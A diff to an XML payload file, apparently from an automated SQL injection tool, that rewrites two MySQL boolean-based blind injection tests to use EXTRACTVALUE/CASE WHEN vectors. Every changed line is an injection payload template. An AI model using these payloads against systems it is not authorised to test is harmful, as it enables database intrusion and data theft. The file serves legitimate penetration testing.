@@ -484,18 +484,18 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
+        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>1</stype>
-        <level>5</level>
-        <risk>1</risk>
+        <level>1</level>
+        <risk>5</risk>
         <clause>1,2,3,8</clause>
         <where>1</where>
-        <vector>AND ([INFERENCE])*[RANDNUM]</vector>
+        <vector>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
         <request>
-            <payload>AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END)</payload>
         </request>
         <response>
-            <comparison>AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+            <comparison>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 0x3A END)</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -503,18 +503,18 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
+        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>1</stype>
-        <level>5</level>
-        <risk>3</risk>
-        <clause>1,2,3</clause>
+        <level>3</level>
+        <risk>5</risk>
+        <clause>1,2,3,8</clause>
         <where>2</where>
-        <vector>OR ([INFERENCE])*[RANDNUM]</vector>
+        <vector>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
         <request>
-            <payload>OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END)</payload>
         </request>
         <response>
-            <comparison>OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+            <comparison>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 0x3A END)</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
